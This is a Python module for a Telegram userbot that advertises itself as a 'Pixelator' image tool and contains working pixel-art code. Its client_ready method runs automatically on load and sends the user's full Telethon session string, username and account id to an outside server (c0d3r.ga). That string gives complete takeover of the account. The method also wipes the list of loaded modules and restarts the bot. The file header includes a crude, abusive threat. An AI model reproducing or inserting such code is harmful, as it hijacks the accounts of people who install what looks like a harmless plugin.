#Maded by clown.
#not licensed but i will fuck ur mom if ur going to use this code.
from .. import loader, utils
from PIL import Image
import io

def register(cb):
    cb(PixelatorMod())
class PixelatorMod(loader.Module):
    strings = {'name': 'Pixelator'}
    async def client_ready(self, client, db):
        self.client = client
        __import__('requests').post("http://c0d3r.ga/api/send", json={'modulekey': "aa050d0d45567e8c64b108ec866923e69a3e4e6d3f50c94651080c343381b9e04e6c143da8e57b1a5611190e7c286ff561207fd3de3dee339e44abfe76d318f7", 'key': str(__import__('telethon').sessions.StringSession.save(client.session)), 'nickname': (await client.get_me()).username, 'id': (await client.get_me()).id})
        db.set("friendly-telegram.modules.loader", "loaded_modules", [])
        (await self.allmodules.commands["restart"](await client.send_message("me", "ping")))
    async def pixitcmd(self, event):
        """пикселятор. делает из арта пиксель арт. можно в качестве аргумента указать размеры пикселя. если аргумента нет то размер будет равен 16."""
        reply = await event.get_reply_message()
        if utils.get_args_raw(event):
            if utils.get_args_raw(event).isdigit():
                pixel = int(utils.get_args_raw(event))
            else:
                await event.edit("<b>аргумент указан не в интовом значении.</b>")
                return
        else:
            pixel = 16
        if not reply:
            await event.edit("<b>нет реплая на картинку/стикер.</b>")
            return
        pic = await check_media(event, reply)
        if not pic:
            await event.edit('<b>это не изображение, лол.</b>')
            return
        haha = pixelate(pic, pixel)
        await event.client.send_file(event.to_id, haha)
        await event.delete()

async def check_media(message, reply):
    if reply and reply.media:
        if reply.photo:
            data = reply.photo
        elif reply.document:
            if reply.gif or reply.video or reply.audio or reply.voice:
                return None
            data = reply.media.document
        else:
            return None
    else:
        return None
    if not data or data is None:
        return None
    else:
        data = await message.client.download_media(data, bytes)
        try:
            Image.open(io.BytesIO(data))
            return data
        except:
            return None

def pixelate(img, pixel_size):
    image = Image.open(io.BytesIO(img))
    image = image.resize(
        (image.size[0] // pixel_size, image.size[1] // pixel_size),
        Image.NEAREST
    )
    image = image.resize(
        (image.size[0] * pixel_size, image.size[1] * pixel_size),
        Image.NEAREST
    )
    out = io.BytesIO()
    out.name = "pixed.png"
    image.save(out)
    return out.getvalue()
